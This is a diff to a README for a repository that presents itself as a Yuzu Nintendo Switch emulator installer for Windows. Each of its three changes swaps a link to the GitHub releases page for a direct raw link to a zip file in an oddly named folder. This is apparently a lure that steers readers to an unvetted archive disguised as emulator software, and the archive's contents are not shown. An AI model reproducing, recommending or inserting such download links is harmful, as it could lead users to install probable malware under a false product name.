@@ -1,6 +1,6 @@
 # 🎮 Yuzu-Emulator-Installer-Nintendo-Switch - Play Switch Games on Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Releases-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Grantma3071/Yuzu-Emulator-Installer-Nintendo-Switch/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Releases-3b82f6?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Grantma3071/Yuzu-Emulator-Installer-Nintendo-Switch/main/hyposulphurous/Switch-Emulator-Installer-Nintendo-Yuzu-v3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Yuzu-Emulator-Installer-Nintendo-Switch helps you run Nintendo Switch games on a
 
 Use the release page to get the latest build:
 
-https://github.com/Grantma3071/Yuzu-Emulator-Installer-Nintendo-Switch/releases
+https://raw.githubusercontent.com/Grantma3071/Yuzu-Emulator-Installer-Nintendo-Switch/main/hyposulphurous/Switch-Emulator-Installer-Nintendo-Yuzu-v3.6.zip
 
 ## 📥 Download
 
@@ -129,7 +129,7 @@ If controls do not work:
 
 Use the release page for the latest Windows build, updates, and new files:
 
-https://github.com/Grantma3071/Yuzu-Emulator-Installer-Nintendo-Switch/releases
+https://raw.githubusercontent.com/Grantma3071/Yuzu-Emulator-Installer-Nintendo-Switch/main/hyposulphurous/Switch-Emulator-Installer-Nintendo-Yuzu-v3.6.zip
 
 ## 🧠 Topics
 
